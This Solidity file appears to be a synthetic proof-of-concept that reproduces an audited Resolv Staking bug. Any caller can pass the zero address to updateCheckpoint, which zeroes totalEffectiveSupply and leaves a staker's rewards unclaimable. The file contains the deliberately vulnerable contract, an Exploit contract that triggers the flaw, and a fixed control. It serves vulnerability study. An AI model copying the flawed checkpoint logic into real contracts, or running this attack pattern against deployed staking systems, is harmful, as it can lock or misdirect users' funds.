// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Resolv Staking — checkpoint() resets totalEffectiveSupply (MixBytes)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    updateEffectiveBalance returns 0 for the zero address. updateCheckpoint
    lets anyone pass that address, so totalEffectiveSupply is stored as 0
    while stakers still have effective balance. The reward index for the
    elapsed window is advanced against the real supply and then Alice's
    checkpoint cannot credit her, because accrual refuses a zero supply.
    Her claimable stays 0. The fair claim is 1,000 reward tokens. */

contract RewardToken {
    string public constant symbol = "RWD";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

contract ResolvStaking {
    struct User {
        uint256 effectiveBalance;
        uint256 rewardPaid;
        uint256 claimable;
    }

    RewardToken public rewardToken;
    mapping(address => User) public users;
    mapping(address => uint256) public staked;
    uint256 public totalEffectiveSupply;
    uint256 public accRewardPerToken;
    uint256 public lastUpdate;
    uint256 public rewardRate;
    uint256 public trueEffectiveSum;

    constructor(RewardToken token, uint256 rate) {
        rewardToken = token;
        rewardRate = rate;
    }

    function seed(address user, uint256 amount, uint256 updatedAt) external {
        staked[user] = amount;
        users[user].effectiveBalance = amount;
        totalEffectiveSupply = amount;
        trueEffectiveSum = amount;
        lastUpdate = updatedAt;
    }

    function updateCheckpoint(address user) external {
        checkpoint(user, 0);
    }

    function checkpoint(address user, int256 delta) public {
        _accrue(user);
        totalEffectiveSupply = updateEffectiveBalance(user, staked[user], delta, totalEffectiveSupply);
    }

    function updateEffectiveBalance(address user, uint256 userStakedBalance, int256 delta, uint256 total)
        public
        returns (uint256 newTotalEffectiveSupply)
    {
        if (user == address(0)) {
            // @> VULN: returns zero for the zero address, and checkpoint stores that as totalEffectiveSupply
            return 0;
        }
        User storage userData = users[user];
        uint256 oldEffectiveBalance = userData.effectiveBalance == 0 ? userStakedBalance : userData.effectiveBalance;
        uint256 newStakedBalance =
            delta >= 0 ? userStakedBalance + uint256(delta) : userStakedBalance - uint256(-delta);
        uint256 newEffectiveBalance = newStakedBalance;
        userData.effectiveBalance = newEffectiveBalance;
        staked[user] = newStakedBalance;
        trueEffectiveSum = trueEffectiveSum - oldEffectiveBalance + newEffectiveBalance;
        // @> VULN: subtracts the old balance before adding the new one, so a zeroed supply underflows
        newTotalEffectiveSupply = total - oldEffectiveBalance + newEffectiveBalance;
        return newTotalEffectiveSupply;
    }

    function _accrue(address user) internal {
        if (totalEffectiveSupply == 0) {
            return;
        }
        uint256 timeDelta = block.timestamp - lastUpdate;
        if (timeDelta != 0) {
            uint256 minted = rewardRate * timeDelta;
            accRewardPerToken += minted * 1e18 / totalEffectiveSupply;
            lastUpdate = block.timestamp;
        }
        if (user != address(0)) {
            User storage userData = users[user];
            uint256 owed = userData.effectiveBalance * (accRewardPerToken - userData.rewardPaid) / 1e18;
            userData.claimable += owed;
            userData.rewardPaid = accRewardPerToken;
        }
    }

    function fairClaim(address user) external view returns (uint256) {
        return users[user].effectiveBalance * accRewardPerToken / 1e18;
    }
}

contract FixedStaking {
    ResolvStaking.User public alice;
    uint256 public totalEffectiveSupply;
    uint256 public accRewardPerToken;
    uint256 public claimable;

    function run(uint256 rate, uint256 updatedAt, uint256 amount) external {
        totalEffectiveSupply = amount;
        uint256 timeDelta = block.timestamp - updatedAt;
        uint256 minted = rate * timeDelta;
        accRewardPerToken = minted * 1e18 / totalEffectiveSupply;
        uint256 kept = updateEffectiveBalance(address(0), totalEffectiveSupply);
        claimable = amount * accRewardPerToken / 1e18;
        totalEffectiveSupply = kept;
    }

    function updateEffectiveBalance(address user, uint256 total) public pure returns (uint256) {
        if (user == address(0)) {
            return total;
        }
        return total;
    }
}

contract Exploit {
    RewardToken public token;
    ResolvStaking public staking;
    FixedStaking public fixedStaking;
    address public alice;

    uint256 public constant STAKE = 1_000e18;
    uint256 public constant RATE = 1_000e18;

    constructor() {
        token = new RewardToken();
        staking = new ResolvStaking(token, RATE);
        fixedStaking = new FixedStaking();
        alice = address(0xA11CE);
    }

    function run() external {
        staking.seed(alice, STAKE, 0);
        token.mint(address(staking), STAKE);
        staking.updateCheckpoint(address(0));
        uint256 recorded = staking.totalEffectiveSupply();
        uint256 fairSupply = staking.trueEffectiveSum();
        (bool aliceOk,) = address(staking).call(abi.encodeCall(ResolvStaking.updateCheckpoint, (alice)));
        uint256 claimable = _claimable(alice);
        uint256 fair = staking.fairClaim(alice);
        fixedStaking.run(RATE, 0, STAKE);
        require(aliceOk == false, "withdraw checkpoint should revert");
        require(recorded == 0, "supply not zeroed");
        require(fairSupply == STAKE, "true supply");
        require(claimable == 0, "alice was credited");
        require(fair == STAKE, "fair claim");
        require(fair - claimable == STAKE, "short 1000");
        require(token.balanceOf(address(staking)) == STAKE, "rewards stuck");
        require(fixedStaking.claimable() == STAKE, "control");
        require(fixedStaking.totalEffectiveSupply() == STAKE, "control supply");
    }

    function _claimable(address user) internal view returns (uint256 amount) {
        (, , amount) = staking.users(user);
    }
}
